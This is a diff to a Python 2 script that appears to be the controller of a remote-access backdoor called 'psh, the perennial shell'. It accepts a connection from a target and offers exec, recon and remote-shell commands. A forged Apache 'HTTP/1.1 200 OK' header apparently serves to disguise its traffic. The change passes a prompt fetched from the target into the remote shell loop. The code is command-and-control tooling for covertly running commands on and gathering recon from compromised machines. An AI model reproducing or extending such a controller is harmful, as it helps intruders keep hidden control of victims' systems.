@@ -10,6 +10,7 @@ from datetime import datetime
 
 OUT = 'archive'
 SIZE = 1024
+PSH_PROMPT = 'psh > '
 FAKEOK = """HTTP/1.1 200 OK\r
 Date: Tue, 19 Mar 2013 22:12:25 GMT\r
 Server: Apache\r
@@ -32,11 +33,12 @@ def ctrl_shell_server(s, PORT):
     cmds = ['exit', 'help', 'exec', 'recon', 'shell']
     print '[+] ({}) Entering control shell'.format(datetime.now())
     conn, addr = s.accept()
+    prompt = ctrl_shell_exchange(conn, 'getprompt')
     print 'Welcome to psh, the perennial shell!'
     print 'Running `help\' will give you a list of supported commands.'
     while True:
         try:
-            inp = raw_input('psh > ')
+            inp = raw_input(PSH_PROMPT)
             if inp == '':
                 continue
             # exit
@@ -72,7 +74,7 @@ def ctrl_shell_server(s, PORT):
             # shell
             elif inp.split()[0] == cmds[4]:
                 if inp == 'shell':
-                    ctrl_shell_shell(conn)
+                    ctrl_shell_shell(conn, prompt)
                 else:
                     print 'Basic shell on target.'
                     print 'usage: shell [-h]'
@@ -108,11 +110,11 @@ def ctrl_shell_recon_write(response, out_dir):
         print 'psh : Recon log written to {}'.format(outfile)
 
 
-def ctrl_shell_shell(s):
+def ctrl_shell_shell(s, prompt):
     pass
     while True:
         try:
-            inp = raw_input('psh > shell > ')
+            inp = raw_input(PSH_PROMPT + prompt)
             if inp == '':
                 continue
             elif inp == 'exit':
